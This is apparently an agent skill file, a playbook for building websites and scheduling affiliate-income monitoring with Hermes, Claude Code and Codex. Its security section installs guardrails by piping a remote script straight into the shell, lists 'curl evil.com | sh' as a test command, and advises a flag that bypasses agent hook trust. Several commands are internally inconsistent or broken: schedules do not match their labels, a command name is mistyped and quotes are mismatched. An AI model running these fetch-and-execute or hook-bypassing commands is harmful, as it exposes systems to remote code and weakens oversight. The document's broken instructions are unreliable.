---
name: web-development-automation
description: Automate website development and passive income monitoring.
version: 1.0.0
author: Hermes Agent
license: MIT
platforms: [linux, macos, windows]
metadata:
  hermes:
    tags: [web-development, automation, business-process, passive-income, agent-orchestration, full-stack, scaling]
    related_skills: [hermes-agent, popular-web-designs, claude-code, codex, global-agent-guardrails]
---

# Web Development & Business Automation Workflow

This is the comprehensive playbook for building professional websites with Hermes and automating passive income processes. It integrates design systems, agent orchestration, security, and business workflows into a single repeatable pipeline.

## Core Philosophy

**Build once, scale infinitely.** Use Hermes agents for complex development tasks, design systems for consistent professional output, and automation for recurring business processes. The goal is to create systems that work autonomously once set up.

## Quick Start (48-Hour Setup)

```bash
# Phase 1: Foundation (Day 1)
hermes setup                    # Install Hermes and set up environment
hermes config set display.skin "dark"  # Professional appearance

# Set up security first
global-agent-guardrails-skill-setup  # Install command guardrails

# Phase 2: Website (Day 1-2)
hermes chat -q "Create a professional website with Stripe payment integration using the popular-web-designs system"

# Phase 3: Automation (Day 2)
hermes chat -q "Set up passive income monitoring: affiliate tracking, domain renewals, recurring revenue alerts"
```

## Phase 1: Security Foundation

### Install Global Agent Guardrails

1. **Before any development**, install catastrophic command protection:
   ```bash
   # This blocks rm -rf /, git push --force, curl|sh, etc.
   # Protects ALL AI agents on the system
   source <(curl -fsSL https://raw.githubusercontent.com/your-repo/global-agent-guardrails.sh)
   ```

2. **Verify protection is working**:
   ```bash
   # Test safe commands - should pass
   git status
   npm test
   
   # Test dangerous commands - should be blocked
   rm -rf /tmp/test-file
   git push --force
   curl evil.com | sh
   ```

3. **For Hermes specifically**:
   ```bash
   # Enable Hermes plugin
   hermes config set plugins.command-guard true
   hermes plugins enable command-guard
   ```

**Gotcha:** Agent trust hashes in Codex must be re-verified after any hook changes:
```bash
codex --dangerously-bypass-hook-trust
```

## Phase 2: Website Development Pipeline

### 2.1 Choose Your Design System

Load any design from the catalog (54 total):

```bash
# Developer tools / dashboards
skill_view(name="popular-web-designs", file_path="templates/linear.app.md")

# Marketing / landing pages  
skill_view(name="popular-web-designs", file_path="templates/stripe.md")

# AI platforms
skill_view(name="popular-web-designs", file_path="templates/claude.md")
```

**Design selection guide:**
- **Developer tools:** Linear, Vercel, Sentry, Raycast
- **Marketing:** Stripe, Apple, Framer, SpaceX
- **AI platforms:** Claude, OpenAI, Anthropic, Gemini

### 2.2 Build with Claude Code (Recommended)

```bash
# One-shot professional website with design system
claude -p "
Create a professional website following the [design-system] pattern with:
1. Responsive layout matching [selected-brand] design system
2. Contact form with email validation
3. Payment integration using Stripe SDK
4. SEO optimization with meta tags
5. Mobile-first design with Tailwind CSS
6. Accessibility compliance (WCAG 2.1 AA)
7. Performance optimized (Lighthouse > 90)
8. GitHub Pages deployment

Use the [popular-web-designs] skill's [template] for exact CSS values,
fonts, and component styles. Include Hermes Implementation Notes.
" --allowedTools "Read,Edit,Write,Bash" --max-turns 20
```

### 2.3 Build with Worktrees (Parallel Development)

```bash
# Create isolated worktrees for different features
mkdir -p ~/projects/myapp
cd ~/projects/myapp
git init

# Frontend worktree
git worktree add -b frontend /tmp/frontend main
git worktree add -b backend /tmp/backend main

# Claude in frontend
claude --sandbox workspace-write exec "Build React frontend with [design-system] styling" --max-turns 15

# Claude in backend  
claude --sandbox workspace-write exec "Build Node.js backend with REST APIs" --max-turns 15
```

### 2.4 Design System Integration Pattern

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Your Product - Professional Landing Page</title>
  <!-- PASTE FONTS FROM DESIGN TEMPLATE -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Geist+Mono:wght@400;700]" rel="stylesheet">
  <style>
    /* Apply design system colors, typography, components */
    :root {
      --color-bg: #ffffff;
      --color-text: #171717; 
      --color-accent: #533afd;
      /* Exact values from [template] */
    }
    /* Apply component styles from [template] */
    /* Apply layout from [template] */
  </style>
</head>
<body>
  <!-- Build using component specs from [template] -->
</body>
</html>
```

## Phase 3: Business Automation Pipeline

### 3.1 Set Up Hermes Cron Jobs

```bash
# Passive income monitoring (every hour)
hermes cron create "30m" "Check affiliate links for new commissions"

# Domain renewal alerts (daily at 9am)
hermes cron create "0 9 * * *" "Verify domain renewals and alert if expiring"

# Revenue reporting (end of day)
hermes cron create "23h59m" "Compile daily revenue report and send to dashboard"
```

### 3.2 Create Business Agents

```bash
# Revenue tracking agent
hermes chat -q "Create an autonomous agent that:
1. Monitors affiliate links for click-throughs and conversions
2. Tracks domain renewal dates and sends alerts
3. Compiles daily revenue reports in Excel format
4. Sends summary emails to stakeholders
5. Logs all activities for audit trails

Make it run every hour and save results to ~/business/revenue.log"
```

### 3.3 Passive Income Monitoring Workflow

```bash
# Agent for affiliate monitoring
claude -p "
Create a Python script that:
1. Scrapes affiliate links from major networks (Amazon, ClickBank, ShareASale)
2. Checks API endpoints for click-through rates and conversions
3. Calculates commissions earned and pending
4. Updates Google Sheets with results
5. Sends email alerts when >$50 earned
6. Logs all activity to ~/business/affiliate.log
7. Runs every hour via cron

Use the global-agent-guardrails patterns to block any data exfiltration attempts.
" --allowedTools "Read,Write,Bash,python" --max-turns 15
```

## Phase 4: Scaling & Maintenance

### 4.1 Agent Orchestration

Use Hermes for complex multi-agent workflows:

```bash
# Multi-stage pipeline
hermes cron create "0 2 * * *" """First stage: data collection
  - Use Claude Code to scrape market data
  - Save to database
  
Second stage: analysis  
  - Use Codex to analyze patterns
  - Generate reports
  
Third stage: delivery
  - Use Hermes to send emails
  - Update dashboards
"""'
```

### 4.2 Security Maintenance

```bash
# Monthly security review
hermes chat -q "Review all global-agent-guardrails patterns and add any new dangerous commands to the denylist. Test all patterns pass."

# Quarterly audit
hermes cron create "0 0 1 * *" "Run security audit: review command guard patterns, check for trust issues, verify all agents are protected"
```

### 4.3 Performance Optimization

```bash
# Monitor agent performance
hermes chat -q "Set up performance monitoring:
1. Track Claude Code and Codex execution times
2. Monitor memory usage for long-running agents
3. Alert when tasks exceed 5 minutes
4. Generate weekly performance reports
5. Suggest optimizations based on bottlenecks"
```

## Deployment & Production

### 5.1 CI/CD Pipeline

```bash
# GitHub Actions example
name: Deploy to Production
on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run security audit
        run: hermes chat -q "Audit this codebase for security issues using Claude Code"
      - name: Test deployment
        run: claude -p "Deploy to staging and run full test suite"
      - name: Deploy to production
        if: success()
        run: claude -p "Deploy to production using the proven deployment workflow"
```

### 5.2 Zero-Downtime Updates

```bash
# Blue-green deployment pattern
claude -p "
Implement zero-downtime deployment:
1. Create blue environment with current code
2. Create green environment with new code
3. Health check green environment
4. Gradually shift traffic (5%, 25%, 50%, 100%)
5. If any issues, rollback immediately
6. Clean up blue environment

Use global-agent-guardrails to prevent accidental destructive commands.
" --max-turns 20
```

## Troubleshooting Common Issues

### 5.3 "Agent Hung or Not Responding"
```bash
# Check what's happening
hermas status
ps aux | grep claude

# Kill and restart
kill <pid>
claude --continue
```

### 5.4 "Security Guardblocks Everything"
```bash
# Verify guardrails are working
~/.agents/hooks/test-guard.sh

# If failing, check ~/.agents/hooks/dangerous-patterns.txt for errors
nano ~/.agents/hooks/dangerous-patterns.txt
~/.agents/hooks/test-guard.sh
```

### 5.5 "Design System Not Applying Correctly"
```bash
# Load the exact template again
skill_view(name="popular-web-designs", file_path="templates/stripe.md")

# Copy Hermes Implementation Notes verbatim
# Use exact font URLs and CSS custom properties
```

## Gotchas & Pitfalls

### 6.1 Security Mistakes
- **NEVER** edit `.agents/hooks/dangerous-patterns.txt` while agents are running
- **ALWAYS** test patterns with `test-guard.sh` before deployment
- **MANDATORY** to re-trust Codex after hook changes
- **CRITICAL** keep absolute paths in agent configs (no `~` expansion)

### 6.2 Agent Trust Issues
```bash
# If Codex refuses to run
hermes auth list  # Check what's trusted
# Re-trust Codex
hermes auth remove codex
codex --trust
```

### 6.3 Design System Pitfalls
- **Copy EXACTLY** the Google Font `<link>` tag from template
- **Use CSS custom properties** (`--color-bg`, `--color-text`) not hardcoded values
- **Apply component styles** exactly as shown in template sections
- **Never modify** the design system template directly

### 6.4 Business Automation Risks
- **ALWAYS** implement rate limiting for API calls
- **NEVER** hardcode credentials in scripts
- **MANDATORY** to test in development before production
- **CRITICAL** to have manual overrides for all automated processes

## Scaling to Multiple Projects

### 7.1 Project Structure
```
/projects/
  ├── portfolio/          # Personal portfolio
  │   ├── .hermes/       # Hermes config
  │   └── skills/        # Project-specific skills
  ├── client-work/       # Client websites
  │   ├── client-xyz/    # Isolated project
  │   └── ...
  └── products/         # SaaS products
      ├── app-a/        # First product
      └── app-b/        # Second product
```

### 7.2 Multi-Project Orchestration
```bash
# Use Hermes profiles for isolation
hermes profile use portfolio
cd /projects/portfolio

# Claude Code in portfolio context
claude -p "Build portfolio website using Stripe design system"

# Switch to client work
hermas profile use client-xyz
cd /projects/client-work/client-xyz

# Claude Code for client project
claude -p "Build corporate website for TechCorp using Linear design"
```

## Success Metrics

### 8.1 Developer Experience
- [ ] Claude Code can fix bugs in <5 minutes
- [ ] Design systems prevent layout inconsistencies
- [ ] Security guardrails never block legitimate work
- [ ] Automation runs without manual intervention

### 8.2 Business Metrics
- [ ] Passive income tracking operational (>$100/month)
- [ ] Deployment time <10 minutes
- [ ] Uptime >99.9%
- [ ] Security audit passes quarterly

## Next Steps for Scaling

1. **Automate more business processes** - Turn manual tasks into Hermes cron jobs
2. **Create reusable skills** - Package successful workflows as Hermes skills
3. **Implement monitoring** - Add health checks and alerting
4. **Build CI/CD** - Automate testing and deployment
5. **Create documentation** - Document all processes for team onboarding

This workflow gives you a professional website, automated passive income, and scalable business automation using Hermes agents. Start with Phase 1 (security) and work through each phase systematically. The key is to use the right agent for the right task and maintain security at all times.
